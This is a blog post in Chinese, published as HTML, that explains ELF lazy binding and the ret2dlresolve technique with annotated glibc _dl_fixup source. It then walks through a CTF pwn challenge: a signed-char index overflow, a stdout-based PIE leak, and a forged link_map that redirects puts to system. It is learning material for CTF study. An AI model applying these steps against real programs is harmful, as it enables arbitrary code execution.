@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="放假啦*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。烤漆+摆烂停更了好久好久好久，欠了好多好多好多债&#x2F;(ㄒoㄒ)&#x2F;~~（一堆复现），开启假期学习生活的第一步从还债开始">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dlresolve和stdout做无leak堆题">
+<meta property="og:url" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="放假啦*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。烤漆+摆烂停更了好久好久好久，欠了好多好多好多债&#x2F;(ㄒoㄒ)&#x2F;~~（一堆复现），开启假期学习生活的第一步从还债开始">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/wjx.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/setvbuf.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/plt.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/dynamic.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/dynstr.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/dynsym.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/relplt.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/dl.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/dlend.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/%E5%8F%82%E6%95%B0.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/malloc64.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/pltsec64.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/plt64.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/dl64.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/ida.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/%E5%9B%BE.jpg">
+<meta property="article:published_time" content="2023-06-27T07:03:23.000Z">
+<meta property="article:modified_time" content="2023-06-27T18:03:12.577Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="ret2dlresolve">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://akaieurus.github.io/2023/06/27/ret2dlresolve/wjx.png">
+
+<link rel="canonical" href="http://akaieurus.github.io/2023/06/27/ret2dlresolve/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ret2dlresolve和stdout做无leak堆题 | Eurus禁止摆烂！</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Eurus禁止摆烂！</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">In a world of locked rooms, the man with the key is king.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://akaieurus.github.io/2023/06/27/ret2dlresolve/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Eurus">
+      <meta itemprop="description" content="本人2022年11月—12月进入了一种原因未知的摆烂状态，故搭建博客来警醒自己。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Eurus禁止摆烂！">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ret2dlresolve和stdout做无leak堆题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-06-27 15:03:23" itemprop="dateCreated datePublished" datetime="2023-06-27T15:03:23+08:00">2023-06-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-06-28 02:03:12" itemprop="dateModified" datetime="2023-06-28T02:03:12+08:00">2023-06-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/wp/" itemprop="url" rel="index"><span itemprop="name">wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>放假啦*★,°*:.☆(￣▽￣)&#x2F;$:*.°★* 。<br>烤漆+摆烂停更了好久好久好久，欠了好多好多好多债&#x2F;(ㄒoㄒ)&#x2F;~~（一堆复现），开启假期学习生活的第一步从还债开始 </p>
+<img src="/2023/06/27/ret2dlresolve/wjx.png" class title="wjx">
+<span id="more"></span>
+
+<h2 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h2><p>gdb调试的时候用step命令没有完整的延迟绑定过程，用stepi单步就可以了</p>
+<h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><h4 id="延迟绑定流程"><a href="#延迟绑定流程" class="headerlink" title="延迟绑定流程"></a>延迟绑定流程</h4><img src="/2023/06/27/ret2dlresolve/setvbuf.png" class title="setvbuf">
+
+<ul>
+<li><p>主调函数跳入对应.plt，.plt内容如下：</p>
+<img src="/2023/06/27/ret2dlresolve/plt.png" class title="plt">
+</li>
+<li><p>跳至对应.got.plt中所存地址，.got.plt中所存的初始地址是.plt[1]，所以未绑定时相当于顺序执行.plt，绑定后.got.plt中所存的就是函数的实际地址，这一步之后就直接执行对应函数</p>
+</li>
+<li><p>入栈当前函数对应index</p>
+</li>
+<li><p>跳至plt[0]（plt段开头）</p>
+</li>
+<li><p>入栈linkmap地址（got[1]），执行_dl_runtime_resolve（got[2]），执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, reloc_arg)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="一些重要的段"><a href="#一些重要的段" class="headerlink" title="一些重要的段"></a>一些重要的段</h4><h5 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h5><p>包含了一些关于动态链接的关键信息，重要的是DT_STRTAB, DT_SYMTAB, DT_JMPREL三项，分别包含指向.dynstr, .dynsym, .rel.plt三段的指针</p>
+<img src="/2023/06/27/ret2dlresolve/dynamic.png" class title="dynamic">
+
+<p>对应结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
+
+<h5 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h5><p>一个字符串表，相关数据结构引用一个字符串时，用的是相对这个section头的偏移</p>
+<img src="/2023/06/27/ret2dlresolve/dynstr.png" class title="dynstr">
+
+<h5 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h5><p>一个符号表，每个结构体记录一个符号</p>
+<img src="/2023/06/27/ret2dlresolve/dynsym.png" class title="dynsym">
+
+<p>对应结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding，对于导入函数符号而言是0x12 */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;<span class="comment">//对于导入函数符号而言，其他字段都是0</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h5><p>重定位表，也是一个结构体数组，每个项对应一个导入函数</p>
+<img src="/2023/06/27/ret2dlresolve/relplt.png" class title="relplt">
+
+<p>对应结构体</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* 指向got表的指针 */</span></span><br><span class="line">  Elf32_Word	r_info;			 </span><br><span class="line"> <span class="comment">//只关心从第二个字节开始的值((val)&gt;&gt;8)，忽略07</span></span><br><span class="line"> <span class="comment">//这个导入函数的符号在.dynsym中的下标</span></span><br><span class="line">  Elf32_Sword	r_addend;		<span class="comment">/* Addend */</span></span><br><span class="line">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure>
+
+<h4 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h4><img src="/2023/06/27/ret2dlresolve/dl.png" class title="dl">
+
+<p>先看一下link_map的结构，使用的到的只有两个成员</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ElfW(Addr) l_addr;	<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">			file and the addresses in memory.  */</span></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    ……</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>l_info成员指向了之前说到的.dynamic段</p>
+<p>l_addr我的理解是如果开了PIE它的值就是PIE基址</p>
+<p>_dl_runtime_resolve实际调用_fl_fixup函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc-2.23</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">	   <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);					</span><br><span class="line">    <span class="comment">//取出.dynsym段指针</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);	  </span><br><span class="line">    <span class="comment">//取出.dynstr段指针</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);	  </span><br><span class="line">    <span class="comment">//取出.rel.plt段第reloc_arg项的指针</span></span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];		  </span><br><span class="line">    <span class="comment">//取出.dynsym的第reloc_arg个符号项</span></span><br><span class="line">  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);		  </span><br><span class="line">    <span class="comment">//取出.got.plt表的地址</span></span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Elf32_Rela的r_info成员开头的07字节检查  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 检查(sym-&gt;st_other)&amp;0x03是否为0 */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ……</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	  ……</span><br><span class="line">	</span><br><span class="line">   <span class="comment">/* _dl_lookup_symbol_x函数通过strtab + sym-&gt;st_name（查找函数名）确定函数具体地址 */</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">     ……</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 已知函数地址，进行一些处理（result-&gt;value）  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">				   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">					  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* got表写入函数真实地址，或者返回真实地址 */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用_fl_fixup结束后_dl_runtime_resolve的汇编码如下</p>
+<img src="/2023/06/27/ret2dlresolve/dlend.png" class title="dlend">
+
+<p><code>mov  dword  ptr [esp],eax</code>将返回的函数真实地址放入栈顶，<code>ret 0xc</code>在将rip跳转至函数真实地址的同时栈帧上调0xc，刚好是函数的参数（32位函数参数放在栈上）</p>
+<img src="/2023/06/27/ret2dlresolve/%E5%8F%82%E6%95%B0.png" class title="参数">
+
+<p>（终于结束了我的天呐）</p>
+<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><h4 id="延迟绑定流程-1"><a href="#延迟绑定流程-1" class="headerlink" title="延迟绑定流程"></a>延迟绑定流程</h4><img src="/2023/06/27/ret2dlresolve/malloc64.png" class title="malloc64">
+
+<ul>
+<li><p>主调函数跳入对应.plt.sec，.plt.sec内容如下：</p>
+<img src="/2023/06/27/ret2dlresolve/pltsec64.png" class title="pltsec64">
+</li>
+<li><p>跳至对应.plt，入栈index，跳转至plt[0]</p>
+<img src="/2023/06/27/ret2dlresolve/plt64.png" class title="plt64">
+</li>
+<li><p>入栈linkmap地址（got[1]），执行_dl_runtime_resolve_xsavec（got[2]）</p>
+</li>
+</ul>
+<h4 id="dl-runtime-resolve-xsavec"><a href="#dl-runtime-resolve-xsavec" class="headerlink" title="_dl_runtime_resolve_xsavec"></a>_dl_runtime_resolve_xsavec</h4><img src="/2023/06/27/ret2dlresolve/dl64.png" class title="dl64">
+
+<p>64位传参从栈变成了寄存器，所以_dl_runtime_resolve_xsavec有些不一样</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="32位-1"><a href="#32位-1" class="headerlink" title="32位"></a>32位</h4><h5 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h5><p>伪造.dynamic段的字符串表</p>
+<h5 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h5><p>Partial RELRO下.dynamic只读，无法修改，这时候和延迟绑定有关且在可写段的只有link_map，所以可以伪造link_map，见例题</p>
+<h2 id="DAS5-matchmaking-platform"><a href="#DAS5-matchmaking-platform" class="headerlink" title="DAS5 matchmaking platform"></a>DAS5 matchmaking platform</h2><h3 id="漏洞和利用"><a href="#漏洞和利用" class="headerlink" title="漏洞和利用"></a>漏洞和利用</h3><p>input函数存在漏洞</p>
+<img src="/2023/06/27/ret2dlresolve/ida.png" class title="ida">
+
+<ul>
+<li><p>首先输入覆盖a1[0]~a1[128（0x80）]</p>
+</li>
+<li><p>v3的类型为char（范围-128~127），本题中加到了128会溢出为-128，所以本题中加减的地址为0x4140（content）和0x40c8（ptr），会溢出为0x40c0（pptr）和0x4048（char类型值和__int64类型值相加char类型值会被符号拓展为8字节，c语言基础忘的一干二净了）</p>
+</li>
+<li><p>程序中几个重要数据关系</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pptr-&gt;ptr-&gt;堆</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>我们可以通过溢出修改*pptr指向stdout（0x40c8→0x4080）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pptr-&gt;<span class="built_in">stdout</span>-&gt;_IO_2_1_stdout_</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>这样当询问”Photo(URL) &gt;&gt; “取*pptr时我们实际上修改的就是_IO_2_1_stdout_，可以泄露pie基址</p>
+</li>
+<li><p>再通过溢出修改*pptr指向link_map（0x4080→0x4008），询问”Hobby &gt;&gt; “就能修改link_map了</p>
+</li>
+</ul>
+<p>ps：我本来想这么麻烦不如直接改puts的got表，但puts的got表地址最低字节是0x20就是空格，会被过滤掉根本发不出去，淦🙂</p>
+<h3 id="link-map的伪造"><a href="#link-map的伪造" class="headerlink" title="link_map的伪造"></a>link_map的伪造</h3><p>_dl_fixup函数中按符号查找的部分如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
+
+<p>函数名是由strtab + sym-&gt;st_name得到的</p>
+<ul>
+<li><p>得到strtab的部分代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"><span class="comment">/* 展开宏定义后如下</span></span><br><span class="line"><span class="comment"> * (l)-&gt;l_info[5]-&gt;d_un.d_ptr</span></span><br><span class="line"><span class="comment"> * link_map-&gt;l_info[5]+0x8 */</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>sym-&gt;st_name是函数名字符串在符号表中的下标，这道题劫持的free函数是0x77</p>
+</li>
+</ul>
+<p>这道题需要在free延迟绑定的时候将puts的got表改成system的地址，所以还需要伪造一下link_map-&gt;l_addr</p>
+<p>将获取的函数真实地址写回got表的步骤如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);	<span class="comment">//取出.got.plt段地址，reloc-&gt;r_offset为got表偏移</span></span><br><span class="line">														   <span class="comment">//l-&gt;l_addr为pie基地址</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span></span><br><span class="line"><span class="title function_">elf_machine_fixup_plt</span> <span class="params">(<span class="keyword">struct</span> link_map *<span class="built_in">map</span>, <span class="type">lookup_t</span> t,</span></span><br><span class="line"><span class="params">		       <span class="type">const</span> ElfW(Sym) *refsym, <span class="type">const</span> ElfW(Sym) *sym,</span></span><br><span class="line"><span class="params">		       <span class="type">const</span> ElfW(Rela) *reloc,</span></span><br><span class="line"><span class="params">		       ElfW(Addr) *reloc_addr,</span></span><br><span class="line"><span class="params">		       ElfW(Addr) value)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> *reloc_addr = value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>puts的got表就在free后面所以pie基址加8就行</p>
+<p>伪造出来的结构大概这样</p>
+<img src="/2023/06/27/ret2dlresolve/%E5%9B%BE.jpg" class title="图">
+
